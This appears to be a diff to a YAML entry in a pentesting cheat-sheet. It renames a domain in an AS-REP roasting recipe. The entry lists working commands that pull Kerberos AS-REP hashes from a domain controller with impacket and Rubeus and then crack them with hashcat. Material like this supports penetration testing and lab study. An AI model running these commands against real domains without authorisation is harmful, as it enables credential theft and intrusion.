@@ -4,7 +4,7 @@ description: |
 commands:
   - have: Username
     cmd: |
-      impacket-GetNPUsers senshu.sh/ -usersfile users.txt -dc-ip 10.10.10.27 -no-pass -request
+      impacket-GetNPUsers senshu.local/ -usersfile users.txt -dc-ip 10.10.10.27 -no-pass -request
       .\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
       hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
 phase:
